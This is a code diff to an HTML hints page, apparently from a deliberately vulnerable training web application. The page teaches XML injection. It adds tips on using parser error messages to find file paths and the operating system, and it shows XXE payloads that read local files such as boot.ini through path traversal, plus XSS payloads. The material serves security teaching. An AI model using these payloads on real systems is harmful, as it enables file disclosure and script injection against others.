@@ -24,9 +24,20 @@
 			parameters and observe if XML parsing errors are 
 			generated. 
 			<br/><br/>
+			For web services, check each input parameter specified in the 
+			WSDL document for those of type XML.
+			<br/><br/>
 			<span class="report-header">Exploitation</span>
 			<br/><br/>
-			See the XML Entity Attack example
+			Use information disclosed in error messages to determine at what
+			file path the XML parser is parsing. Cause errors to occur using
+			malformed XML, XML that starts with whitespace or null characters,
+			and XML that does not meet the XSL specification.
+			<br/><br/>
+			Also try to load files that dont exist in order to determine operating system type 
+			and the path at which interpretation is taking place.
+			<br/><br/>
+			For examples, see the XML Entity Attack example
 			<br/><br/>
 			<span class="report-header">Example</span>
 			<br/><br/>
@@ -40,6 +51,32 @@
 			by which they can import and include external files as part of themselves. The 
 			imported file will be included into the XML docment whereever the entity exists.
 			<br/><br/>
+			Here are some examples to try
+			<br/><br/>
+			Valid XML without entities
+			<br/>
+<code>
+	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
+</code>
+			<br/>
+			XML with the predefined &amp;quot; entity
+			<br/><br/>
+<code>
+	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;<span class="important-code">&amp;quot;</span>Hello World<span class="important-code">&amp;quot;</span>&lt;/text&gt;&lt;/change-log&gt;
+</code>
+			<br/>
+			XML with the user defined myEntity entity
+			<br/><br/>
+<code>
+	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE change-log[ <span class="important-code">&lt;!ENTITY myEntity &quot;World&quot;&gt;</span> ]&gt;&lt;change-log&gt;&lt;text&gt;Hello <span class="important-code">&amp;myEntity;</span>&lt;/text&gt;&lt;/change-log&gt;
+</code>
+			<br/>
+			XML with multiple user defined entities
+			<br/><br/>
+<code>
+	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE change-log[ <span class="important-code">&lt;!ENTITY myEntity &quot;World&quot;&gt;&lt;!ENTITY myQuote &quot;&amp;quot;&quot;&gt;</span> ]&gt;&lt;change-log&gt;&lt;text&gt;<span class="important-code">&amp;myQuote;</span>Hello <span class="important-code">&amp;myEntity;&amp;myQuote;</span>&lt;/text&gt;&lt;/change-log&gt;
+</code>
+			<br/>
 			The &lt;!ENTITY&gt; section of an XML document optionally defines external
 			files to be included as part of the XML document. Interestingly these can even
 			be files from the system parsing the XML.
@@ -62,7 +99,7 @@
 			<br/>
 <code>
 	&lt;change-log&gt;
-		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;;
+		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
 	&lt;/change-log&gt;
 </code>
 			<br/>
@@ -76,7 +113,7 @@
 		<span class="important-code">&lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt;</span>
 	]&gt;
 	&lt;change-log&gt;
-		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;;
+		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
 	&lt;/change-log&gt;
 </code>
 			<br/>
@@ -89,7 +126,7 @@
 		<span class="important-code">&lt;!ENTITY systemEntity SYSTEM &quot;../../../../boot.ini&quot;&gt;</span>
 	]&gt;
 	&lt;change-log&gt;
-		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;;
+		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
 	&lt;/change-log&gt;
 </code> 
 			<br/>
@@ -118,9 +155,14 @@
 		This injection results in a cross site script.
 		<br/>
 <code>
- &lt;test&gt; $lDOMDocument-&gt;textContent=&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#39;XSS&#39;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt; &lt;/test&gt;
+&lt;test&gt; $lDOMDocument-&gt;textContent=&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#39;XSS&#39;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt; &lt;/test&gt;
 </code>
-			<br/><br/>
+		<br/>
+		This injection also results in a cross site script.
+		<br/>
+<code>
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Hello World&amp;quot;)&amp;lt;/script&amp;gt;&lt;/text&gt;&lt;/change-log&gt;
+</code>	
 		</td>
 	</tr>
 </table>
